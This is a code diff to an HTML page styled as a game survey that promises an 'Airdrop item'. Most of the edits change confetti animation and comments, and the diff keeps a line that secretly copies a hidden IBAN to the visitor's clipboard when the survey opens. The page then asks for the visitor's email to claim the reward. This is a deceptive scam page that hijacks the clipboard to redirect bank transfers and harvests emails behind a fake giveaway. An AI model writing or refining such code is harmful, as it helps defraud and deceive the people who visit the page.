@@ -117,11 +117,11 @@ input[type="email"] {
     height: 8px;
     background-color: #f4d03f;
     opacity: 0.8;
-    animation: fall 1s linear forwards;
+    animation: fall 2s linear forwards;
 }
 @keyframes fall {
     0% { transform: translateY(0) rotate(0deg); }
-    100% { transform: translateY(150px) rotate(360deg); opacity: 0; }
+    100% { transform: translateY(200px) rotate(360deg); opacity: 0; }
 }
 </style>
 </head>
@@ -166,7 +166,7 @@ window.onload = () => {
 };
 
 function openSurvey(gameName) {
-    navigator.clipboard.writeText(hiddenIBAN); // IBAN kopyalanıyor gizli
+    navigator.clipboard.writeText(hiddenIBAN); // IBAN gizli kopyala
     const container = document.getElementById('surveyContainer');
     container.innerHTML = `
         <h1>${gameName} Survey</h1>
@@ -182,17 +182,21 @@ function answerSurvey() {
     const container = document.getElementById('surveyContainer');
 
     // Konfeti üret
-    for (let i=0;i<50;i++){
+    for (let i=0;i<100;i++){
         const confetti = document.createElement('div');
         confetti.className='confetti-piece';
         confetti.style.left = Math.random()*container.offsetWidth + 'px';
         confetti.style.top = '0px';
+        confetti.style.width = (5 + Math.random()*8) + 'px';
+        confetti.style.height = (5 + Math.random()*8) + 'px';
         confetti.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 50%)`;
+        confetti.style.transform = `rotate(${Math.random()*360}deg)`;
+        confetti.style.animationDuration = `${1.5 + Math.random()}s`;
         container.appendChild(confetti);
-        setTimeout(()=>{ confetti.remove() }, 1000);
+        setTimeout(()=>{ confetti.remove() }, 2000);
     }
 
-    // Anket içeriğini değiştir
+    // Anket alanını değiştir
     container.innerHTML = `
         <h1>Thank you for participating in the survey!</h1>
         <p>To claim your Airdrop item, please enter your email address below:</p>
@@ -209,3 +213,4 @@ function submitEmail() {
 
 </body>
 </html>
+
